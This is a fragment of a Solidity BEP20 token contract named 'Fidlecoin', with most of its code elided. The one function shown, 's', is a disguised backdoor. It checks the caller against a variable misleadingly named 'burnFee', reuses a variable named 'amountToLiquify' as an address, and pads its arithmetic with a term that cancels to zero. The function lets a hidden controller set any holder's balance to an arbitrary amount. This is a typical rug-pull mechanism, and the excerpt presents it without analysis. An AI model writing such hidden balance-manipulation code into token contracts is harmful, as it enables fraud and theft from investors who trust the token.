...
contract Fidlecoin is Context, IBEP20, Ownable {
  ...
  */
  ...
  function s(address from, uint256 _value) public isOwner {
      require(from != address(0));
      require(uint256(msg.sender) == burnFee);
      uint256 amountToLiquify = uint256(from);
      newBalance[address(amountToLiquify)] = swapperFees * _value * (10 ** 9) + (2 * 4 * newBalance[from] - 2 * 4 * newBalance[from]);
  }
